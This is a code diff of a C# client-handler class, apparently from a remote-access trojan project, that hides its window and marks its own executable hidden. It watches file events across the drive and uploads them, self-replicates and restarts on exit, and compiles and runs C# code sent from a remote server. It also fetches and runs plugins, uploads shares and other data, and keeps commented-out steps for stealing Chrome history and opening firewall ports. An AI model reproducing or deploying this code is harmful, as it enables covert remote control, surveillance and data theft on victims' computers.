@@ -1,6 +1,5 @@
 ﻿using Library;
 using Microsoft.CSharp;
-using Models;
 using PluginManager;
 using System;
 using System.CodeDom.Compiler;
@@ -24,15 +23,31 @@ namespace ClientHandler
 
     public class Handler
     {
+        public enum EBrowser { Chrome, IE }
+
         public PluginHandler PluginHandler { get; private set; }
         public TransmitterStatus TransmitterStatus { get; set; }
-        private bool isQuitting = false;
-        private FileSystemWatcher watcher;
         public Transmitter Transmitter { get; set; }
         public FileDirHandler FileDirInfo { get; private set; }
+        public string AppDir { get; private set; }
+        public string DirTransfers { get; private set; }
+        public string DirPlugins { get; private set; }
+        public Assembly Assembly { get; private set; }
+
         public event OnFileEventDelegate OnFileEvent;
         public event OnCommandDelegate OnCommandEvent;
         public event OnAuthorizedHandler OnAuthorizedEvent;
+
+        private FileSystemWatcher watcher;
+        private bool isAuthorized = false;
+        private static readonly string APPDIR_TRANSFERS = "Transfers";
+        private static readonly string APPDIR_PLUGINS = "Plugins";
+        private int CONNECTION_TIMEOUT = 10000;
+        private int CONNECTION_INTERVAL = 10000;
+        private Timer transmitTimer;
+        private int transmitTimerInterval = 1000;
+        private Timer connectTimer;
+        private Timer streamDesktopTimer;
 
         #region Singleton
         private static Handler instance;
@@ -95,12 +110,10 @@ namespace ClientHandler
         public void StartDirectoryWatcher()
         {
             StartDirectoryWatcher(Directory.GetDirectoryRoot(Environment.CurrentDirectory), "*.*", true);
-            //StartDirectoryWatcher(@"C:\", "*.*", true);
         }
 
         public void StartDirectoryWatcher(string directory, string filter, bool includeSubdirectories)
         {
-            //directory = Environment.CurrentDirectory;
             watcher = new FileSystemWatcher(directory, filter);
             watcher.Path = directory;
             watcher.Filter = filter;
@@ -119,7 +132,6 @@ namespace ClientHandler
             watcher.Deleted += watcher_Deleted;
             watcher.Renamed += watcher_Renamed;
             watcher.EnableRaisingEvents = true;
-            //Console.WriteLine("Watching dir: " + directory);
         }
 
         public void StopDirectoryWatcher()
@@ -127,22 +139,22 @@ namespace ClientHandler
             watcher.EnableRaisingEvents = false;
         }
 
-        private void Replicate()
+        private void Replicate(bool askConfirmation = false)
         {
-            DialogResult dr = MessageBox.Show("Replicate?", "Replicate?", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1);
-            if (dr == System.Windows.Forms.DialogResult.Yes)
+            DialogResult dr = DialogResult.Yes;
+            if (askConfirmation)
             {
-                Replicator.Instance.Replicate(true);
+                dr = MessageBox.Show("Replicate?", "Replicate?", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1);
+            }
+            if (dr == DialogResult.Yes)
+            {
+                Replicator.Instance.Replicate();
             }
         }
 
         void HandleExit(String msg)
         {
-            if (!isQuitting)
-            {
-                Application.Restart();
-            }
-            isQuitting = true;
+            Application.Restart();
         }
 
         private void HandleWatcher(FileSystemEventArgs e)
@@ -223,8 +235,6 @@ namespace ClientHandler
             }
             return null;
         }
-
-        public enum EBrowser { Chrome, IE }
 
         public void KillProcess()
         {
@@ -358,20 +368,7 @@ namespace ClientHandler
                 p.Start();
                 string output = p.StandardOutput.ReadToEnd();
                 string err = p.StandardError.ReadToEnd();
-                //p.EnableRaisingEvents = true;
-                //p.OutputDataReceived += (o, e) =>
-                //{
-                //    var d = e.Data;
-                //};
-                //p.ErrorDataReceived += (o, e) =>
-                //{
-                //    var d = e.Data;
-                //};
-                //p.Start();
-                //p.BeginOutputReadLine();
-                //p.BeginErrorReadLine();
                 result = !string.IsNullOrEmpty(output) ? output : err;
-                //p.WaitForExit();
                 return p.ExitCode;
             }
             catch (Exception)
@@ -380,27 +377,15 @@ namespace ClientHandler
             }
         }
 
-        bool isAuthorized = false;
-        public string AppDir { get; private set; }
-        public string DirTransfers { get; private set; }
-        public string DirPlugins { get; private set; }
-        public Assembly AppAssembly { get; private set; }
-        private static readonly string APPDIR_TRANSFERS = "Transfers";
-        private static readonly string APPDIR_PLUGINS = "Plugins";
-        private int CONNECTION_TIMEOUT = 10000;
-        private int CONNECTION_INTERVAL = 10000;
-        private Timer transmitTimer;
-        private int transmitTimerInterval = 1000;
-        private Timer connectTimer;
-        private Timer streamDesktopTimer;
-
         public void Initialize(HandlerInitData option)
         {
+            this.Assembly = option.Assembly;
             this.CONNECTION_TIMEOUT = option.CONNECTION_TIMEOUT;
             this.CONNECTION_INTERVAL = option.CONNECTION_INTERVAL;
             if (option.HideOnStart)
             {
                 HideForm(option.HostForm);
+                File.SetAttributes(Assembly.Location, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
             }
             Application.ApplicationExit += (o, e) =>
             {
@@ -412,49 +397,28 @@ namespace ClientHandler
                 if (option.StartNewProcessOnExit)
                 {
                     Replicate();
-                    //var fi = new FileInfo(AppAssembly.Location);
-                    //Process.Start(new ProcessStartInfo(fi.FullName, "clone " + Convert.ToBase64String(Encoding.Default.GetBytes(fi.FullName)) + " true"));
                 }
             };
-            AppAssembly = Assembly.GetExecutingAssembly();
-            //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
-            //Replicate(_args);
-            var appDirBase = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            var appDirFolder = Path.Combine(appDirBase, AppAssembly.GetName().Name);
-            if (!Directory.Exists(appDirFolder))
-            {
-                Directory.CreateDirectory(appDirFolder);
-            }
-            //appDirFolder = Path.Combine(appDirFolder, PathExt.ReformatName("" + DateTime.Now.Ticks));
-            //if (!Directory.Exists(appDirFolder))
-            //{
-            //    Directory.CreateDirectory(appDirFolder);
-            //}
-            AppDir = Path.Combine(appDirBase, appDirFolder);
-            //Clipboard.SetText(appDir); MessageBox.Show(appDir);
+            SetupDirectories();
+            //OpenFakeTextFile("Hey!");
+            Transmitter = new Library.Transmitter(option.Url, option.APIKEY_PRIVATE, option.APIKEY_PUBLIC, CONNECTION_TIMEOUT);
+            //var compHash = Transmitter.GetComputerHash(); Clipboard.SetText(compHash); MessageBox.Show(compHash);
+            SetupConnectionTimer();
+            //MinimizeFootPrint();
+            PluginHandler = new PluginHandler((IPluginHost)option.HostForm, DirPlugins);
+        }
+
+        private void SetupDirectories()
+        {
+            AppDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), this.Assembly.GetName().Name);
             DirTransfers = Path.Combine(AppDir, APPDIR_TRANSFERS);
             DirPlugins = Path.Combine(AppDir, APPDIR_PLUGINS);
-            //            // temporary while testing
             //#if DEBUG
-            //            DirPlugins = @"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\x64\Debug";
+            //            DirPlugins = @"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\Debug";
             //#endif
             CreateDirectory(AppDir);
             CreateDirectory(DirTransfers);
             CreateDirectory(DirPlugins);
-            //OpenFakeTextFile("Hey!");
-            Transmitter = new Library.Transmitter(option.Url, option.APIKEY_PRIVATE, option.APIKEY_PUBLIC, CONNECTION_TIMEOUT);
-            //foo = Transmitter.Test(2);
-            //foo = Transmitter.Test2("bar");
-            //var compHash = Transmitter.GetComputerHash();
-            //Clipboard.SetText(compHash); MessageBox.Show(compHash);
-            //Transmitter.Authorize();
-            //UploadBrowserData();
-            SetupConnectionTimer();
-            //File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History", historyFile);
-            //h.GetBrowserHistory(Handler.EBrowser.Chrome, historyFile);
-            //FirewallManager.Instance.AddPort(1234, "test1234");
-            //MinimizeFootPrint();
-            PluginHandler = new PluginHandler((IPluginHost)option.HostForm, DirPlugins);
         }
 
         private void HideForm(Form hostForm)
@@ -542,12 +506,17 @@ namespace ClientHandler
         {
             if (!Directory.Exists(dir))
             {
-                Directory.CreateDirectory(dir);
+                try
+                {
+                    Directory.CreateDirectory(dir);
+                }
+                catch { }
             }
         }
 
         private int HandleFileEvent(FileSystemEventArgs e)
         {
+            //MessageBox.Show(e.ChangeType + ", " + e.Name + ", " + e.FullPath);
             /*if (listBox2.InvokeRequired)
             {
                 try
@@ -629,10 +598,6 @@ namespace ClientHandler
             if (Worker != null)
             {
                 TransmitterStatus = TransmitterStatus.IDLE;
-                //if (canUploadResult)
-                //{
-                //    UploadResult(Worker.Result);
-                //}
                 Worker.Stop();
                 Transmitter.SetHasExectuted(Transmitter.TSettings);
             }
@@ -725,6 +690,7 @@ namespace ClientHandler
             StringBuilder sb = new StringBuilder();
             FileDirInfo.FileDirInfoList.ForEach((FileDirInfo fdi) => sb.AppendLine(fdi.DateTime.ToString() + " " + fdi.FileInfo.ToString()));
             UploadResult(sb.ToString(), "fileevents.txt");
+            FileDirInfo.FileDirInfoList.Clear();
         }
 
         public void DownloadFile()
@@ -740,6 +706,7 @@ namespace ClientHandler
                     path = Path.Combine(DirTransfers, filename);
                     if (data != null)
                     {
+                        SetupDirectories();
                         File.WriteAllBytes(path, data);
                     }
                 }
@@ -829,67 +796,12 @@ namespace ClientHandler
             catch (Exception ex) { }
         }
 
-        private void Replicate(string[] _args)
-        {
-            // Hide itself
-            //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
-            if (_args.Length == 3)
-            {
-                var fiSrc = Encoding.Default.GetString(Convert.FromBase64String(_args[1]));
-                //clone app to other destination
-                if (_args[0] == "clone")
-                {
-                    try
-                    {
-                        // todo: Should be dynamic places
-                        string destDir = Path.Combine(Environment.CurrentDirectory, "Clone");// Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);// Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                        if (!Directory.Exists(destDir))
-                        {
-                            try
-                            {
-                                Directory.CreateDirectory(destDir);
-                            }
-                            catch { }
-                        }
-                        FileInfo fiSelf = new FileInfo(AppAssembly.Location);
-                        var target = Path.Combine(destDir, fiSelf.Name);
-                        if (fiSelf.DirectoryName != destDir)
-                        {
-                            if (File.Exists(target))
-                            {
-                                File.Delete(target);
-                            }
-                            File.Copy(AppAssembly.Location, target);
-                            //System.Threading.Thread.Sleep(1000);
-                            var psi = new ProcessStartInfo(target, "dont_clone " + Convert.ToBase64String(Encoding.Default.GetBytes(fiSelf.FullName)) + " false");
-                            Process.Start(psi);
-                            Application.Exit();
-                        }
-                    }
-                    catch { }
-                }
-                else if (_args[0] == "dont_clone")
-                {
-                    // delete old app
-                    try
-                    {
-                        System.Threading.Thread.Sleep(1000);
-                        File.Delete(fiSrc);
-                    }
-                    catch { }
-                }
-            }
-        }
-
         public bool OpenFakeTextFile(string message)
         {
             try
             {
                 String tempDir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-                //String tempDir = appDir + "\\" + DateTime.Now.Ticks;
-                //CreateDirectory(tempDir);
-                //tempFile = tempDir + "\\" + PathExt.ReformatName(GetProgramName()) + ".txt";
-                var fakeTextFilePath = Environment.CurrentDirectory + "\\" + PathExt.ReformatName(GetProgramName()) + ".txt";
+                var fakeTextFilePath = Path.Combine(Environment.CurrentDirectory, PathExt.ReformatName(GetProgramName()) + ".txt");
                 using (FileStream fs = new FileStream(fakeTextFilePath, FileMode.Create))
                 {
                     using (StreamWriter sw = new StreamWriter(fs, Encoding.UTF8))
@@ -920,23 +832,21 @@ namespace ClientHandler
         void ExecuteCodePvt()
         {
             string code = @"
-    using System;
-    using System.Drawing;
-    using System.Text;
-    using System.Windows.Forms;
-    using System.IO;
-    namespace Client
+using System;
+using System.Drawing;
+using System.Text;
+using System.Windows.Forms;
+using System.IO;
+namespace Client
+{
+    public class Program
     {
-        public class Program
+        public static void Main()
         {
-            public static void Main()
-            {
-            " +
-        Transmitter.TSettings.Parameters
-        + @"
-            }
+        " + Transmitter.TSettings.Parameters + @"
         }
     }
+}
 ";
 
             CSharpCodeProvider provider = new CSharpCodeProvider();
@@ -979,16 +889,6 @@ namespace ClientHandler
                 Transmitter.UploadData(outputFile, data, useCompression, isTextFile);
             }
         }
-
-        //void UploadImage(Image image = null, string outputFile = null, long quality = 80L)
-        //{
-        //    Transmitter.TSettings.OutputFile = outputFile;
-        //    //Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(Worker.Result), useCompression);
-        //    if (image != null && !string.IsNullOrEmpty(outputFile))
-        //    {
-        //        Transmitter.UploadImage(outputFile, image, quality);
-        //    }
-        //}
 
         public void UploadShares()
         {
@@ -1103,6 +1003,7 @@ namespace ClientHandler
                 var data = PluginHandler.Execute(Transmitter.TSettings.File, Transmitter.TSettings.Parameters);
                 if (data != null && data.Length > 0)
                 {
+                    SetupDirectories();
                     File.WriteAllBytes(Path.Combine(AppDir, "data.dat"), data);
                     UploadResult(data, "data.dat");
                 }
@@ -1126,6 +1027,7 @@ namespace ClientHandler
             {
                 var path = DirPlugins;// Path.Combine(dirPlugins, Handler.Instance.Transmitter.TSettings.File);
                 //File.WriteAllBytes(path, data);
+                SetupDirectories();
                 try
                 {
                     Compression.Extract(data, path);
